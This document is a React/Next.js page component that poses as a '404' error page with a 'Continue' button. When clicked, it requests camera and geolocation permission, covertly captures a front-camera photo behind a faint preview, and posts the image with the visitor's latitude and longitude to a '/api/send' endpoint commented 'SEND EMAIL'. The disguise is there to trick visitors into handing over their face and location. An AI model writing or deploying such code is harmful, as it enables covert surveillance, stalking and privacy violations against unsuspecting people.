"use client";
import { useRef, useState } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);

  async function capture() {
    console.log("Capture clicked");

    // 🔴 MUST be first — triggers permission prompt
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    // 🔴 Location permission (also must be direct)
    const position = await new Promise<GeolocationPosition>((resolve, reject) =>
      navigator.geolocation.getCurrentPosition(resolve, reject)
    );

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    // now safe to show preview
    setShowPreview(true);
    await video.play();

    // allow frame to render
    await new Promise(r => setTimeout(r, 1000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);
    console.log("Image length:", image.length);

    // cleanup
    stream.getTracks().forEach(t => t.stop());
    setShowPreview(false);

    // 🔴 SEND EMAIL
    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image,
        lat: position.coords.latitude,
        lon: position.coords.longitude
      })
    });

    console.log("Send API called");
  }

  return (
    <div className="error-container">
      <h1>404</h1>
      <p>Click here to continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          style={{
            width: 160,
            height: 160,
            opacity: 0.3,
            borderRadius: 12,
            marginBottom: 16
          }}
        />
      )}

      <button onClick={capture}>Continue</button>
    </div>
  );
}
